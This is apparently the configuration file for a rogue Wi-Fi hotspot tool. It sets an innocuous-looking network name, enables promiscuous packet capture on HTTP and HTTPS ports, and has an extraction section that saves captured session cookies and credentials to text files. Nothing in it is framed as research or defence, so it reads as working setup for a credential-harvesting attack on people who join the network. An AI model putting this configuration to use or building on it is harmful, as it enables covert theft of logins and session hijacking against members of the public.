[HOTSPOT]
# Basic hotspot configuration
SSID_PREFIX=SecureHotspot_
CHANNEL=6
WPA_PASSPHRASE=SecurePass123
IP_RANGE=192.168.100.100,192.168.100.200,255.255.255.0
GATEWAY=192.168.100.1

[LOGGING]
# Logging configuration
LOG_LEVEL=INFO  # DEBUG, INFO, WARNING, ERROR, CRITICAL
LOG_FILE=logs/hotspot.log
PCAP_DIR=pcap_logs/
PCAP_FILE=capture.pcap

[CAPTURE]
# Packet capture settings
CAPTURE_FILTER=tcp port http or tcp port https or tcp port 8080 or tcp port 8443
SNAPLEN=0  # 0 means use the default
PROMISCUOUS=true

[EXTRACTION]
# Data extraction settings
OUTPUT_DIR=logs/
COOKIE_FILE=cookies.txt
CREDENTIALS_FILE=credentials.txt

[SECURITY]
# Security settings
BLOCK_LAN_ACCESS=true
ENABLE_FIREWALL=true

[ADVANCED]
# Advanced settings
HOSTAPD_DEBUG_LEVEL=1
DNSMASQ_DEBUG=0
